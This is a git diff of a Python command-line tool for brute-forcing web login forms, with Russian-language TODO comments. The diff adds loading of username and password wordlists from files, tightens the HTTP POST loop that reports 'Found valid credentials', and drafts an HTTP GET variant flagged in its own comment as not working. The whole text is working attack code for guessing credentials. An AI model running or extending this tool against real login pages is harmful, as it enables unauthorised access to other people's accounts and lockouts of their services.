@@ -15,7 +15,9 @@ parser.add_argument('-u', '--username', help="Username for authentication", type
 parser.add_argument('-U', '--usernames', help="List with usernames for attack")
 args = parser.parse_args()
 
-# Добавить обработку потоков, считывание данных из файла для опций -U , -P, http_get метод
+# Добавить обработку потоков, считывание данных из файла для опций -U , -P, http_get метод, ssl/tls
+# Добавить обработку большего количества параметров
+# Добавить подробный режим
 
 # Набросок для по шаблонам
 '''
@@ -34,7 +36,10 @@ def init_data():
     error = args.error_message
 
     if args.username == None and args.usernames != None:
-        usernames = args.usernames
+        with open(args.usernames, "r") as file:
+            usernames = []
+            for user in file.readlines():
+                usernames.append(user.strip())
     elif args.username != None and args.usernames == None:
         usernames = [args.username]
     elif args.username != None and args.usernames != None:
@@ -45,7 +50,10 @@ def init_data():
         sys.exit()
 
     if args.password == None and args.passwords != None:
-        passwords = args.passwords
+        with open(args.passwords, "r") as file:
+            passwords = []
+            for passwd in file.readlines():
+                passwords.append(passwd.strip())
     elif args.password != None and args.passwords == None:
         passwords = [args.password]
     elif args.password != None and args.passwords != None:
@@ -63,16 +71,24 @@ def http_post_brute(usernames, passwords, URL, keys, threads, error):
             data = {keys[0]:username, keys[1]:password}
             response = requests.post(URL, data=data)
 
-        if error not in response.text:
-            print (f'[+] Found valid credentials: {username}:{password}')
-            break
-        else:
-            print (f'[*] Attempted: {username}:{password}')
+            if error not in response.text:
+                print (f'[+] Found valid credentials: {username}:{password}')
+                sys.exit() # вербоз мод
+            else:
+                print (f'[*] Attempted: {username}:{password}')
     
 
-def http_get_brute(usernames, passwords, URL, keys, threads, error):
-    for password in passwords:
-        pass
+def http_get_brute(usernames, passwords, URL, keys, threads, error): # Не работает
+    for username in usernames:
+        for password in passwords:
+            response = requests.get(f"{URL}/?{keys[0]}={username}&{keys[1]}={password}")
+            print (response.text)
+            if error not in response.text:
+                print (f'[+] Found valid credentials: {username}:{password}')
+                break
+            else:
+                print (f'[*] Attempted: {username}:{password}')
+
 
 def start_scan(URL, method, threads, usernames, passwords):
     if args.method == 'http_post':
